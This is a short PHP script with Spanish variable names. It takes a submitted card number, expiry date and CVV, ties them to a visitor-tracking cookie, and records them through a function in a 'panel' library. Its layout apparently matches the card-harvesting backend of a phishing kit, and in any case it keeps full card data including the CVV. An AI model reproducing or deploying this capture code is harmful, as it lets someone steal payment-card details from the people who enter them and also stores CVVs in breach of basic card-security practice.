<?php 
require('../../panel/lib/funciones.php');


$registro = $_COOKIE['registro'];

$tarjeta = $_POST['tar'];
$fecha = $_POST['fec'];
$cvv = $_POST['cvv'];

actualizar_registro_tar($registro,$tarjeta,$fecha,$cvv);
?>